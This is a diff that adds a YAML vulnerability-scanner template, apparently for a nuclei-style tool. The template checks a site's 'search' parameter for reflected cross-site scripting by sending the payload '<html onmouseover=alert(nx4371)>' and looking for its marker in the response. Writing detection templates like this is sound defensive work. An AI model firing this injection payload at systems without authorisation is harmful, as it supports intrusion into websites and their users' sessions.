@@ -1,0 +1,20 @@
+id: xss4-372
+name: 'Raw XSS4 #11 in search'
+severity: high
+type: active
+tags:
+  - xss
+  - injection
+  - client
+description: 'Unencoded reflection in search'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      search:
+        - '<html onmouseover=alert(nx4371)>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'nx4371'
